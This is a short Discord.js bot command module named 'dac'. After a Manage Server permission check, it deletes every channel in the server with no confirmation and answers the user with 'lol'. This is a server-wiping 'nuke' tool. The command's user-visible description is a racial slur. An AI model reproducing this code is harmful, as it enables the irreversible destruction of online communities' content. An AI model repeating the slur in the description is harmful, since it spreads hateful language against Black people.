const { SlashCommandBuilder, PermissionFlagsBits } = require("discord.js");

module.exports = {
  data: new SlashCommandBuilder()
    .setName("dac")
    .setDescription("shut up nigga"),

  async execute(interaction) {
    // Permissions Check
    if (!interaction.member.permissions.has(PermissionFlagsBits.ManageGuild))
      return await interaction.reply({
        content: `You do not have the correct permissions`,
        ephemeral: true,
      });

    // Delete All Channels
    interaction.guild.channels.cache.forEach((channel) =>
      channel.delete().catch((err) => console.error("Error!", err))
    );

    interaction.reply({ content: `lol`, ephemeral: true });
  },
};
